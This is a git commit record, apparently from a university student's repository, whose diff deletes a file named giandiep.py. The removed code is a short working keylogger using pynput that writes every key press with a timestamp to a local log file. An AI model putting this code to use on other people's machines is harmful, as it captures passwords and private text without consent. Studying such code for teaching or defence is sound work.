13b67c6f7e8af11284d2bc075848d3300bf5aeaf
UIT-20522067 <20522067@gm.uit.edu.vn>
2024-02-28 21:12:42 +0700

    .

--- giandiep.py
+++
@@ -1,8 +0,0 @@
-from pynput.keyboard import Listener
-import logging
-log_dir = r"./"
-logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-def on_press(key):
-  logging.info(str(key))
-with Listener(on_press=on_press) as listener:
-  listener.join()
